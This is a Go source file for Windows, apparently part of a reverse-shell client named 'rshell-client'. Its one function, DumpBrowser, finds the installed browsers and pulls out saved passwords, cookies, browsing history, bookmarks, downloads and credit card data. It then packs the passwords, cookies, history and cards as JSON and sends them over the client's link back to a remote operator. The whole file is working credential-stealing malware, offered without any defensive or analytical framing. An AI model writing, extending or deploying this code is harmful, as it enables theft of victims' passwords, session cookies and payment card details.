//go:build windows

package commands

import (
	"rshell-client/shared/hackbrowserdata/browser"
	"rshell-client/shared/hackbrowserdata/types"
	"rshell-client/shared/link"
	"encoding/json"
	"fmt"
)

func DumpBrowser(uid string) {
	browsers, err := browser.PickBrowsers(browser.PickOptions{})
	if err != nil {
		link.ReportData(31, []byte(fmt.Sprintf("[!] Browser detection failed: %v\n", err)))
		return
	}
	if len(browsers) == 0 {
		link.ReportData(0, []byte("[!] No browsers detected\n"))
		return
	}

	categories := []types.Category{
		types.Password, types.Cookie, types.History,
		types.CreditCard, types.Bookmark, types.Download,
	}

	for _, b := range browsers {
		link.ReportData(0, []byte(fmt.Sprintf("[*] Extracting %s (%s) ...\n", b.BrowserName(), b.ProfileName())))

		data, err := b.Extract(categories)
		if err != nil {
			link.ReportData(31, []byte(fmt.Sprintf("[!] %s: extraction failed: %v\n", b.BrowserName(), err)))
			continue
		}
		if data == nil {
			continue
		}

		if len(data.Passwords) > 0 {
			d, _ := json.Marshal(data.Passwords)
			link.ReportData(48, []byte(fmt.Sprintf(`{"browser":"%s","category":"password","entries":%s}`, b.BrowserName(), string(d))))
		}
		if len(data.Cookies) > 0 {
			d, _ := json.Marshal(data.Cookies)
			link.ReportData(48, []byte(fmt.Sprintf(`{"browser":"%s","category":"cookie","entries":%s}`, b.BrowserName(), string(d))))
		}
		if len(data.Histories) > 0 {
			d, _ := json.Marshal(data.Histories)
			link.ReportData(48, []byte(fmt.Sprintf(`{"browser":"%s","category":"history","entries":%s}`, b.BrowserName(), string(d))))
		}
		if len(data.CreditCards) > 0 {
			d, _ := json.Marshal(data.CreditCards)
			link.ReportData(48, []byte(fmt.Sprintf(`{"browser":"%s","category":"creditcard","entries":%s}`, b.BrowserName(), string(d))))
		}
	}
}
